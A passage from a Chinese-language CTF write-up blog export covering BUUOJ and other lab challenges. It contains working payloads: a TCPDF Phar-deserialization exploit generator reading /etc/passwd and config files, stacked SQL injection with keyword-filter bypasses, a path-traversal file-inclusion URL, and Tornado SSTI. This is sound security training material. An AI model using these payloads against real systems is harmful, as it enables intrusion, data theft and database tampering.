parameter:&#123;0&#125;&quot;.format(post_obj.group())) parameter = post_obj.group()[8:-2] process(url=url, file=single_file, method=&quot;post&quot;, parameter=parameter)if __name__ == &quot;__main__&quot;: dir = &quot;D:\\\\Onedrive\\\\desktop\\\\src&quot; os.chdir(dir) result_file = os.listdir(dir) p = multiprocessing.Pool(30) for a in range(0, 100): p.apply_async(func=read_file, args=(result_file[a * 30 + 0],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 1],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 2],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 3],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 4],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 5],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 6],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 7],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 8],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 9],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 10],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 11],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 12],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 13],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 14],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 15],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 16],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 17],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 18],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 19],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 20],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 21],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 22],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 23],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 24],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 25],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 26],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 27],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 28],)) p.apply_async(func=read_file, args=(result_file[a * 30 + 29],)) p.close() p.join() read_file(result_file[-1]) print(counts) 最后果然跑出来了，xk0SzyKwfzw.php，GET Efa5BVG，那么直接cat /flag即可。 flag{ac2b73b9-08fa-4525-8073-fc95b0c7f905}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"}]},{"title":"Chaos-Communication-Camp-2019-PDFCreator","slug":"Chaos-Communication-Camp-2019-PDFCreator","date":"2019-08-29T03:52:02.000Z","updated":"2019-12-10T12:15:12.607Z","comments":true,"path":"2019/08/29/Chaos-Communication-Camp-2019-PDFCreator/","link":"","permalink":"http://tiaonmmn.github.io/2019/08/29/Chaos-Communication-Camp-2019-PDFCreator/","excerpt":"一道给了code.zip的题。 打开是个PDF转换网站。我们可以上传一个图片，然后提交生成PDF文件，返回HTML信息。 那么，来看一下源码。index.php中允许我们上传png、jpg、jpeg、gif格式的图片，同时，还使用exif_imagetype()来判断图片格式。最后使用PDFCreator()-&gt;createPdf()来转换PDF文件。同时我们可以得到TCPDF的版本为6.2.13.","text":"一道给了code.zip的题。 打开是个PDF转换网站。我们可以上传一个图片，然后提交生成PDF文件，返回HTML信息。 那么，来看一下源码。index.php中允许我们上传png、jpg、jpeg、gif格式的图片，同时，还使用exif_imagetype()来判断图片格式。最后使用PDFCreator()-&gt;createPdf()来转换PDF文件。同时我们可以得到TCPDF的版本为6.2.13. 网上搜一下TCPDF的漏洞，很容易找到这个，一个反序列化导致的RCE，又是Phar反序列化的锅。简单地说，是TCPDF生成PDF文件的时候允许插入HTML代码，例如&lt;link type=\"text/css\" href=\"style.css\"&gt;，但如果恶意修改href参数为phar://，就会触发Phar的反序列化造成RCE。 那么，我们现在需要做的有 向PDF文件插入恶意的HTML 准备好符合条件的Phar包 找到Phar的反序列化攻击对象 向PDF文件插入HTML，这个很容易办到，在index.php中有如下代码 123456else if (isset($_POST[&quot;pdfcontent&quot;]))&#123; $creator = new \\PDFStuff\\PDFCreator(); $creator-&gt;createPdf($_POST[&quot;pdfcontent&quot;]);&#125;?&gt; 只要我们提交pdfcontent即可。 将Phar文件注入到正常的图片文件中，参考这个。 最后一个问题也是最重要的问题，Phar序列化攻击哪里？在creator.php中有如下代码 123456789101112131415 function \\_\\_destruct() &#123; if (file_exists($this-&gt;tmpfile)) &#123;$info = pathinfo($this-&gt;tmpfile);if ($info[&#x27;extension&#x27;] == &quot;pdf&quot;)&#123; unlink($this-&gt;tmpfile);&#125;else&#123; echo &quot;Could not delete created PDF: Not a pdf. Check the file: &quot; . file_get_contents($this-&gt;tmpfile);&#125; &#125; &#125; __destruct会在类销毁时自动调用，而它会调用file_get_contents()进行读文件。 那么，生成Phar包的代码如下： 1234567891011121314151617181920212223&lt;?php$jpeg_header_size = &quot;\\xff\\xd8\\xff\\xe0\\x00\\x10\\x4a\\x46\\x49\\x46\\x00\\x01\\x01\\x01\\x00\\x48\\x00\\x48\\x00\\x00\\xff\\xfe\\x00\\x13&quot;.&quot;\\x43\\x72\\x65\\x61\\x74\\x65\\x64\\x20\\x77\\x69\\x74\\x68\\x20\\x47\\x49\\x4d\\x50\\xff\\xdb\\x00\\x43\\x00\\x03\\x02&quot;.&quot;\\x02\\x03\\x02\\x02\\x03\\x03\\x03\\x03\\x04\\x03\\x03\\x04\\x05\\x08\\x05\\x05\\x04\\x04\\x05\\x0a\\x07\\x07\\x06\\x08\\x0c\\x0a\\x0c\\x0c\\x0b\\x0a\\x0b\\x0b\\x0d\\x0e\\x12\\x10\\x0d\\x0e\\x11\\x0e\\x0b\\x0b\\x10\\x16\\x10\\x11\\x13\\x14\\x15\\x15&quot;.&quot;\\x15\\x0c\\x0f\\x17\\x18\\x16\\x14\\x18\\x12\\x14\\x15\\x14\\xff\\xdb\\x00\\x43\\x01\\x03\\x04\\x04\\x05\\x04\\x05\\x09\\x05\\x05\\x09\\x14\\x0d\\x0b\\x0d\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14&quot;.&quot;\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\xff\\xc2\\x00\\x11\\x08\\x00\\x0a\\x00\\x0a\\x03\\x01\\x11\\x00\\x02\\x11\\x01\\x03\\x11\\x01&quot;.&quot;\\xff\\xc4\\x00\\x15\\x00\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\xff\\xc4\\x00\\x14\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xda\\x00\\x0c\\x03&quot;.&quot;\\x01\\x00\\x02\\x10\\x03\\x10\\x00\\x00\\x01\\x95\\x00\\x07\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x05\\x02\\x1f\\xff\\xc4\\x00\\x14\\x11&quot;.&quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x03\\x01\\x01\\x3f\\x01\\x1f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20&quot;.&quot;\\xff\\xda\\x00\\x08\\x01\\x02\\x01\\x01\\x3f\\x01\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x06\\x3f\\x02\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01&quot;.&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x3f\\x21\\x1f\\xff\\xda\\x00\\x0c\\x03\\x01\\x00\\x02\\x00\\x03\\x00\\x00\\x00\\x10\\x92\\x4f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00&quot;.&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x03\\x01\\x01\\x3f\\x10\\x1f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda&quot;.&quot;\\x00\\x08\\x01\\x02\\x01\\x01\\x3f\\x10\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x3f\\x10\\x1f\\xff\\xd9&quot;;$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);$phar-&gt;setStub($jpeg_header_size.&quot; __HALT_COMPILER(); ?&gt;&quot;);$o = new \\PDFStuff\\PDFCreator();$o-&gt;tmpfile = &quot;/etc/passwd&quot;;$phar-&gt;setMetadata($o);$phar-&gt;stopBuffering(); 运行后会在当前目录生成phar.phar，我们将其改名为aaa.jpeg，正常上传。然后我们在下面的HTML区域提交&lt;html&gt;&lt;link type=\"text/css\" href=\"phar://./upload/098f6bcd4621d373cade4e832627b4f6.jpeg\"&gt;hello&lt;/link&gt;&lt;/html&gt;即可。（文件名自己换） 然后就怎么都没打通，查了半天原因，发现源码中的PDFCreator类是属于PDFStuff命名空间下的，因此我们同样需要在PDFStuff的命名空间下生成Phar。 1234567891011121314151617&lt;?phpnamespace PDFStuff &#123; class PDFCreator &#123; public $tmpfile = &quot;/etc/nginx/nginx.conf&quot;; public $finalfile; &#125; $phar = new \\Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;setStub(&quot;GIF89a&quot; . &quot; __HALT_COMPILER(); ?&gt;&quot;); $o = new PDFCreator(); $phar-&gt;setMetadata($o); $phar-&gt;stopBuffering();&#125; 注意Phar需要使用\\Phar，因为Phar类是在根命名空间下的。 上传后提交。在返回的页面中出现了/etc/nginx/nginx.conf的内容，我们知道webroot在/var/www/site/下，那么我们直接读/var/www/site/flag.php即可得到flag。 P.S. 如果不手动声明namespace，我们还可以直接include creator.php，即PoC如下： 12345678910111213&lt;?phpinclude &#x27;creator.php&#x27;; $phar = new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;setStub(&quot;GIF89a&quot; . &quot; __HALT_COMPILER(); ?&gt;&quot;); $o = new \\PDFStuff\\PDFCreator(); $o-&gt;tmpfile=&quot;/etc/nginx/nginx.conf&quot;; $phar-&gt;setMetadata($o); $phar-&gt;stopBuffering(); flag{f7a40718-9e36-436a-bc1f-ccbd898e918c}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Phar","slug":"Phar","permalink":"http://tiaonmmn.github.io/tags/Phar/"},{"name":"TCPDF","slug":"TCPDF","permalink":"http://tiaonmmn.github.io/tags/TCPDF/"}]},{"title":"BUUOJ刷题-Web-Easy_Tornado","slug":"BUUOJ刷题-Web-Easy-Tornado","date":"2019-08-28T01:17:51.000Z","updated":"2019-12-10T12:15:12.598Z","comments":true,"path":"2019/08/28/BUUOJ刷题-Web-Easy-Tornado/","link":"","permalink":"http://tiaonmmn.github.io/2019/08/28/BUUOJ%E5%88%B7%E9%A2%98-Web-Easy-Tornado/","excerpt":"2018护网杯 Easy Tornado。 打开后给了三个链接。/flag.txt提示flag在/fllllllllllllag这里。/welcome.txt提示render。/hints.txt提示md5(cookie_secret+md5(filename))。 这三个链接的URL类似，形如file?filename=/hints.txt&amp;filehash=02349af91320adb103fb59e50a5f580a，那么合理猜测filehash的算法应该就是hints.txt里提到的东西了。我们随意修改filename，会发现转到了error?msg=Error。","text":"2018护网杯 Easy Tornado。 打开后给了三个链接。/flag.txt提示flag在/fllllllllllllag这里。/welcome.txt提示render。/hints.txt提示md5(cookie_secret+md5(filename))。 这三个链接的URL类似，形如file?filename=/hints.txt&amp;filehash=02349af91320adb103fb59e50a5f580a，那么合理猜测filehash的算法应该就是hints.txt里提到的东西了。我们随意修改filename，会发现转到了error?msg=Error。 问题在于，为什么error页面需要一个msg参数？我们随意改一下msg，发现显示内容也随之改变。那么这里就是一个SSTI了。 下一步是拿到cookie_secret，我们试一下SSTI读文件。发现读不了，过滤了相当多的字符。那么试一下读Context吧。我们已知平台后端是Tornado框架，翻文档，发现在模板里有一个handler指向当前RequestHandler，那么再根据这个，我们就可以拿到settings了。 提交error?msg=，返回页面里出现了cookie_secret，那么我们就可以手动计算flag文件的hash了。 flag{0b52d4e0-0c3b-4734-8bcb-d208b026336b}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"Tornado","slug":"Tornado","permalink":"http://tiaonmmn.github.io/tags/Tornado/"},{"name":"SSTI","slug":"SSTI","permalink":"http://tiaonmmn.github.io/tags/SSTI/"}]},{"title":"BUUOJ刷题-Web-随便注","slug":"BUUOJ刷题-Web-随便注","date":"2019-08-27T03:55:46.000Z","updated":"2019-12-10T12:15:12.605Z","comments":true,"path":"2019/08/27/BUUOJ刷题-Web-随便注/","link":"","permalink":"http://tiaonmmn.github.io/2019/08/27/BUUOJ%E5%88%B7%E9%A2%98-Web-%E9%9A%8F%E4%BE%BF%E6%B3%A8/","excerpt":"2019强网杯的随便注。 提交1，返回 123456array(2) &#123; [0]&#x3D;&gt; string(1) &quot;1&quot; [1]&#x3D;&gt; string(7) &quot;hahahah&quot;&#125;","text":"2019强网杯的随便注。 提交1，返回 123456array(2) &#123; [0]&#x3D;&gt; string(1) &quot;1&quot; [1]&#x3D;&gt; string(7) &quot;hahahah&quot;&#125; 看起来使用了print_r()把返回的数组直接打印了出来。 提交1'，返回error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1，MySQL数据库了。同时猜一下SQL语句是select ''$_GET['inject']'' from XX。 提交1'--+，把--+过滤了。同样的，提交1'#，正常返回。 提交1' union select 1,2,3%23，发现返回return preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject);。常见关键字过滤了。 提交1' or '1'='1，发现把表里的数据都返回了，or没有被过滤。 那么，提交1' order by 1#，页面正常，提交1' order by 2#，页面正常，提交1' order by 3#，返回error 1054 : Unknown column '3' in 'order clause'，那么这张表里只有两个字段。 然后就涉及到新的知识点堆叠注入。简单地讲，就是MySQL允许将多个SQL语句放在一个查询里提交。我们试一下1'show databases;#，返回 123456789101112131415161718192021222324252627282930array(2) &#123; [0]&#x3D;&gt; string(1) &quot;1&quot; [1]&#x3D;&gt; string(7) &quot;hahahah&quot;&#125;array(1) &#123; [0]&#x3D;&gt; string(11) &quot;ctftraining&quot;&#125;array(1) &#123; [0]&#x3D;&gt; string(18) &quot;information_schema&quot;&#125;array(1) &#123; [0]&#x3D;&gt; string(5) &quot;mysql&quot;&#125;array(1) &#123; [0]&#x3D;&gt; string(18) &quot;performance_schema&quot;&#125;array(1) &#123; [0]&#x3D;&gt; string(9) &quot;supersqli&quot;&#125;array(1) &#123; [0]&#x3D;&gt; string(4) &quot;test&quot;&#125; 看来可以。 那么下一步要拿到当前数据库的信息。提交1';show tables;#，返回 1234567891011121314array(2) &#123; [0]&#x3D;&gt; string(1) &quot;1&quot; [1]&#x3D;&gt; string(7) &quot;hahahah&quot;&#125;array(1) &#123; [0]&#x3D;&gt; string(16) &quot;1919810931114514&quot;&#125;array(1) &#123; [0]&#x3D;&gt; string(5) &quot;words&quot;&#125; 1919810931114514表看起来很有意思。下一步获得列名。提交1';show columns from \\1919810931114514`;`，返回 1234567891011121314151617181920array(2) &#123; [0]&#x3D;&gt; string(1) &quot;1&quot; [1]&#x3D;&gt; string(7) &quot;hahahah&quot;&#125;array(6) &#123; [0]&#x3D;&gt; string(4) &quot;flag&quot; [1]&#x3D;&gt; string(12) &quot;varchar(100)&quot; [2]&#x3D;&gt; string(2) &quot;NO&quot; [3]&#x3D;&gt; string(0) &quot;&quot; [4]&#x3D;&gt; NULL [5]&#x3D;&gt; string(0) &quot;&quot;&#125; flag看来就在1919810931114514表里，但是我们现在需要跨表查询，且不能出现select。两种思路：一种是替换表。我们无法手动查询其他的表，但我们可以将要查询的表改名成当前的表，这样正常访问网页的时候就会带出来我们想要的数据。二是利用MySQL的PREPARE和EXECUTE，任意执行SQL语句。但由于某些关键字的过滤，因此SQL语句需要进行一些处理。 替换表 通过show columns可以看到words和1919810931114514表的结构。words表的结构为： 12345678910111213141516171819202122232425262728293031323334array(2) &#123; [0]&#x3D;&gt; string(1) &quot;1&quot; [1]&#x3D;&gt; string(7) &quot;hahahah&quot;&#125;array(6) &#123; [0]&#x3D;&gt; string(2) &quot;id&quot; [1]&#x3D;&gt; string(7) &quot;int(10)&quot; [2]&#x3D;&gt; string(2) &quot;NO&quot; [3]&#x3D;&gt; string(0) &quot;&quot; [4]&#x3D;&gt; NULL [5]&#x3D;&gt; string(0) &quot;&quot;&#125;array(6) &#123; [0]&#x3D;&gt; string(4) &quot;data&quot; [1]&#x3D;&gt; string(11) &quot;varchar(20)&quot; [2]&#x3D;&gt; string(2) &quot;NO&quot; [3]&#x3D;&gt; string(0) &quot;&quot; [4]&#x3D;&gt; NULL [5]&#x3D;&gt; string(0) &quot;&quot;&#125; 那么我们要做的事情如下： 将words表换成其他名字，将1919810931114514表换成words。 将现在的words表的flag字段改为data，再加一个id字段。 因此payload为：1';RENAME TABLE words TO words1;RENAME TABLE 1919810931114514 TO words;ALTER TABLE words CHANGE flag id VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#。 然后访问1' or '1'='1，因为我们没有给id赋值，正常查询会失败。 EXECUTE 或者，我们直接使用Execute执行存储过程。我们原本要执行的SQL语句是select * from 1919810931114514 ，但是由于不能出现select，我们使用char和concat函数绕过。即将上述SQL语句变成： concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(42),char(32),char(102),char(114),char(111),char(109),char(32),char(96),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(96),char(32)) 因此我们提交：1';set @xx=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(42),char(32),char(102),char(114),char(111),char(109),char(32),char(96),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(96),char(32));prepare abc from @xx;execute abc;# 然后返回了个strstr($inject, \"set\") &amp;&amp; strstr($inject, \"prepare\")，但是随便改一下大小写就好了。 或者不用concat和char，直接把SQL语句16进制编码，即1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;# flag{0a40da1f-849a-4110-bef2-2902426228d2}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://tiaonmmn.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"堆叠注入","slug":"堆叠注入","permalink":"http://tiaonmmn.github.io/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"}]},{"title":"BUUOJ刷题-Web-HCTF-WarmUp","slug":"BUUOJ刷题-Web-HCTF-WarmUp","date":"2019-08-26T14:46:20.000Z","updated":"2019-12-10T12:15:12.600Z","comments":true,"path":"2019/08/26/BUUOJ刷题-Web-HCTF-WarmUp/","link":"","permalink":"http://tiaonmmn.github.io/2019/08/26/BUUOJ%E5%88%B7%E9%A2%98-Web-HCTF-WarmUp/","excerpt":"HCTF2018-WarmUp。","text":"HCTF2018-WarmUp。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; hint.php提示flag在ffffllllaaaagggg文件下。如果file变量是string，并且通过emmm:checkfile()的检测就会include file所指文件。 令我们感兴趣的是在checkfile()中反复出现的$_page = mb_substr($_page,0, mb_strpos($_page . '?', '?');，这个涉及到phpMyAdmin的一个洞CVE-2018-12613，由于PHP会自动urldecode一次，导致我们提交%253f（?的urlencode的urlencode）的时候自动转成%3f，满足if条件，%253f/就会被认为是一个目录，从而include。 所以我们提交http://c970312d-58ed-4287-8cec-92b882939661.node1.buuoj.cn/source.php?file=hint.php%253f/../../../../../../../ffffllllaaaagggg，即可得到flag。 flag{f0156132-3213-4d53-99a2-1a46c5fb6142}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"mb_substr","slug":"mb-substr","permalink":"http://tiaonmmn.github.io/tags/mb-substr/"},{"name":"mb_strpos","slug":"mb-strpos","permalink":"http://tiaonmmn.github.io/tags/mb-strpos/"}]},{"title":"BUUOJ刷题-Misc","slug":"BUUOJ刷题-Misc","date":"2019-08-24T14:10:25.000Z","updated":"2020-03-06T13:08:56.742Z","comments":true,"path":"2019/08/24/BUUOJ刷题-Misc/","link":"","permalink":"http://tiaonmmn.github.io/2019/08/24/BUUOJ%E5%88%B7%E9%A2%98-Misc/","excerpt":"开始刷BUUOJ的题了。留个日志。 签到 emmmm，最基本的签到格式。点击就送。","text":"开始刷BUUOJ的题了。留个日志。 签到 emmmm，最基本的签到格式。点击就送。 # 二维码 打开是个PNG二维码图片。扫了发现提示“Secret is here”，然后拖进010 Editor，发现图片尾部有PK头，提出来是个ZIP压缩包。文件名为4number.txt，然后加密。猜测一下，压缩包被4位数字的密码加密，Ziprello破解就好了。7639。 金三胖 打开是个GIF动态图。Stegsolve打开GIF，一共89帧，第21、51和79帧有三张flag图片。 N种方法解决 给了个KEY.EXE，010 Editor打开发现是个JPEG图片的Base64编码。直接把带上data:image/jpg的字符串丢到浏览器栏，直接出图片，扫一下就好了。 大白 给了个PNG图片，147KB，然而只有679*256大小，尺寸不太对。而且在XnView那里打不开，意味着图片格式有错误。拖进010 Editor那里，CRC那里错了，猜测是图片实际尺寸那里被修改了，把高改大一点，就可以了。 后门查杀（Webshell后门） 给了个压缩包，发现是网站源码。用D盾扫一下就出来了，include/include.php是一个PHPSpy大马，翻一下就有登录MD5。 FLAG 给了个PNG，丢到zsteg里，发现LSB有Zip压缩包。提出来发现是个ELF文件，执行给了flag。 我爱Linux 给了个PNG，打不开，拖到010里发现JFIF，JPEG文件的标志，但是PNG的头，那就改过来，发现是张图片，不知道代表啥。文件尾部也有未知数据。Google识图发现是Monty Python，Python？？大胆猜一下是Python的相关数据。然后发现，这些数据似乎具有特定规律。猜一下是pickle。pickle.load发现确实是pickle数据。那就上脚本解了。 123456789import picklelist1&#x3D;pickle.load(open(&#39;D:\\\\Onedrive\\\\Desktop\\\\noname1&#39;,&#39;rb&#39;))for list in list1: #print(list) temp&#x3D;[&#39; &#39;]*100 for item in list: #print(item) temp[item[0]]&#x3D;item[1] print(&quot;&quot;.join(temp)) 然后就可以看出来了。 菜刀666 给了个流量包。看题目名考察中国菜刀，中国菜刀每次通讯使用base64编码。打开后发现大量HTTP流量，我们base64解码就好了。在TCP Stream 7和9有异常。7的时候传了一个巨大的文件，我们提出来，注意到有z1和z2参数，z2参数传递的是16进制编码。转成文件后发现是个有文字的图片。Stream 9出现了Zip压缩包，提出来发现要密码。输入7提出来的图片所给的文字即可解压。 弱口令 给了个加密Zip，然后去用弱口令跑，没跑出来。发现有注释，空格与Tab符同时使用，那么我们把空格代表.，Tab代表-，换行代表中断，就会得到摩斯电码。.... . .-.. .-.. ----- ..-. --- .-. ..- -- 。HELL0FORUM，解压后得到PNG图片。LSB隐写。用cloacked-pixel提取flag。密码为123456。 被偷走的文件 给了个Pcapng，打开后发现有FTP流量，提出来，发现有密码。RAR爆破得5790，打开就是Flag。 LSB 给了个PNG图片。Stegsolve打开，然后Data Extraction，勾上R G B的0位，LSB模式，发现有另外一张PNG图片。Save bin后发现是张二维码。扫一下就能得flag。 刷新过的图片 这个有点坑。。。刷新指的F5，有一个F5 Steganography，解密出来个Zip，要密码，binwalk直接就提出来flag了。 基础破解 John the ripper用MASK模式?d?d?d?d直接过，2563 AutoKey 给了个USB流量包，发现Leftover Data为8字节，猜测是USB键盘数据。tshark提出来tshark -r task_AutoKey.pcapng -T fields -e usb.capdata &gt; capdata.txt。然后对着USB HID的规范解数据。 1234567891011121314151617181920212223import base64mappings = &#123; 0x04:&quot;A&quot;, 0x05:&quot;B&quot;, 0x06:&quot;C&quot;, 0x07:&quot;D&quot;, 0x08:&quot;E&quot;, 0x09:&quot;F&quot;, 0x0A:&quot;G&quot;, 0x0B:&quot;H&quot;, 0x0C:&quot;I&quot;, 0x0D:&quot;J&quot;, 0x0E:&quot;K&quot;, 0x0F:&quot;L&quot;, 0x10:&quot;M&quot;, 0x11:&quot;N&quot;,0x12:&quot;O&quot;, 0x13:&quot;P&quot;, 0x14:&quot;Q&quot;, 0x15:&quot;R&quot;, 0x16:&quot;S&quot;, 0x17:&quot;T&quot;, 0x18:&quot;U&quot;,0x19:&quot;V&quot;, 0x1A:&quot;W&quot;, 0x1B:&quot;X&quot;, 0x1C:&quot;Y&quot;, 0x1D:&quot;Z&quot;, 0x1E:&quot;1&quot;, 0x1F:&quot;2&quot;, 0x20:&quot;3&quot;, 0x21:&quot;4&quot;, 0x22:&quot;5&quot;, 0x23:&quot;6&quot;, 0x24:&quot;7&quot;, 0x25:&quot;8&quot;, 0x26:&quot;9&quot;, 0x27:&quot;0&quot;, 0x28:&quot;n&quot;, 0x2a:&quot;[DEL]&quot;, 0X2B:&quot; &quot;, 0x2C:&quot; &quot;, 0x2D:&quot;-&quot;, 0x2E:&quot;=&quot;, 0x2F:&quot;[&quot;, 0x30:&quot;]&quot;, 0x31:&quot;\\\\&quot;, 0x32:&quot;~&quot;, 0x33:&quot;;&quot;, 0x34:&quot;&#x27;&quot;, 0x36:&quot;,&quot;, 0x37:&quot;.&quot; &#125;nums = []keys = open(r&#x27;C:\\Users\\Tiaonmmn\\capdata.txt&#x27;)for line in keys.readlines(): print(len(line)) if line==&quot;\\n&quot; or line==&quot;\\r&quot; or len(line)!=17: continue #print(line) 